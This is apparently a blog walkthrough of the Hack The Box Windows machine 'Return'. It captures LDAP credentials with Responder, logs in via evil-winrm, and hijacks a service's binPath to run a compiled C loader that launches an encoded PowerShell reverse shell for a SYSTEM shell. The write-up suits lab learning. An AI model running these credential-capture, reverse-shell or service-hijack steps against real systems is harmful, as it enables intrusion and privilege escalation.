+++
title = 'Hack The Box — Return Writeup'
date = '2026-06-13'
draft = false
tags = ["Hack The Box", "Windows", "Active Directory"]
summary = 'An easy-rated Active Directory box involving LDAP and plaintext credentials for initial access, and abusing services to run a malicious image and obtain a SYSTEM shell.'
[cover]
image = 'main.png'
+++

This is a walkthrough of the machine Return from Hack The Box.

Machine information:
- **Difficulty**: Easy‍
- **OS**: Windows
- **Area of interest**: Enterprise Network, Vulnerability Assessment, Active Directory, Protocols, Common Services, Authentication
- **Vulnerability**: Group Membership, Weak Authentication, Information Disclosure
- **Technology**: SMB, LDAP, WinRM
- **Technique**: Reconnaissance, Password Capture

# Nmap

```bash
sudo nmap -A -sC -sV --open -v -p- <IP>
```

Starting off with an Nmap scan, we discover that the machine is a **domain controller**, and that the domain name is **return.local**.

{{< figure src="image_1.png" align="center" >}}

# Webapp enumeration

Moving to the web application on port **80**, it serves as a printer administrator panel.

{{< figure src="image_2.png" align="center" >}}

At `/settings.php`, the website presents a few settings which are related to **LDAP**.

{{< figure src="image_3.png" align="center" >}}

# Initial access

The setting that is of interest to us on the previously found page is the server address, we will change it to point to **our machine's IP address**, and start **Responder**:

```bash
sudo responder -I tun0 -A
```

Once we click "**Update**" on the page, we get plaintext credentials:

{{< figure src="image_4.png" align="center" >}}

Using these credentials, we can `evil-winrm` into the box, and read the first `user.txt` flag:

```bash
evil-winrm -i <IP> -u svc-printer -p '1edFg43012!!'
```

{{< figure src="image_5.png" align="center" >}}

# Privilege escalation

Using evil-winrm's native `services` command, we discover a service named `VGAuthService`.

```
services
```

{{< figure src="image_6.png" align="center" >}}

While we do not have sufficient permissions to overwrite the binary it's running, we can configure it to run a malicious one - one which will grant us a reverse shell.

To do this, we will first grab the PowerShell one-liner reverse shell from here: https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3.

After modifying the IP address and port to point to our machine, we will encode the text with CyberChef using this recipe: https://cyberchef.org/#recipe=Encode_text('UTF-16LE%20(1200)')To_Base64('A-Za-z0-9%2B/%3D').

The malicious executable we will use will execute this encoded PowerShell reverse shell:

```c
#include <stdlib.h>
#include <windows.h>

int main ()
{
  int i;
  i = system ("powershell -nop -e <BASE64_ENCODED_BLOB>");

  return 0;
}
```

We will compile it locally:

```bash
i686-w64-mingw32-gcc VGAuthService.c -o VGAuthService.exe -lws2_32
```

Start our listener:

```bash
rlwrap nc -lvnp <LPORT>
```

And upload the malicious executable **via evil-winrm**:

```
upload VGAuthService.exe
```

The final stretch - we will first stop the `VGAuthService` service:

```powershell
sc.exe stop VGAuthService
```

Configure it to **run our malicious executable**:

```powershell
sc.exe config VGAuthService binPath="C:\Users\svc-printer\Documents\VGAuthService.exe"
```

And finally **start the service** again:

```powershell
sc.exe start VGAuthService
```

We receive a **SYSTEM** shell, and can read the second `root.txt` flag:

{{< figure src="image_7.png" align="center" >}}